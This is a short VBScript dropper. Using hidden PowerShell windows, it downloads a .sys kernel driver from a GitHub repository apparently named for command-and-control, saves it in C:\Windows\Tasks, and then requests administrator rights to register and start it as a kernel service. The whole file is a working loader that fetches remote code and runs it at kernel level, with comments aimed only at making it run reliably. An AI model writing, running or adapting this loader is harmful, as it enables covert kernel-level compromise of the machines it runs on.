Set objShell = CreateObject("WScript.Shell")
' Using C:\Windows\Tasks because it is a stable, permanent path
driverPath = "C:\Windows\Tasks\se64a.sys"
githubURL = "https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/se64a.sys"

' 1. Download the driver to the stable path
cmdDownload = "powershell -NoP -W Hidden -C ""iwr '" & githubURL & "' -OutFile '" & driverPath & "'"""
objShell.Run cmdDownload, 0, True

' 2. Create and Start the service (Requesting Admin via Verb RunAs)
' We use 'binPath= ' with the exact path to avoid "File Not Found" errors
cmdLoad = "powershell -NoP -W Hidden -C ""Start-Process cmd -ArgumentList '/c sc delete se64a & sc create se64a binPath= " & driverPath & " type= kernel && sc start se64a' -Verb RunAs"""
objShell.Run cmdLoad, 0, False
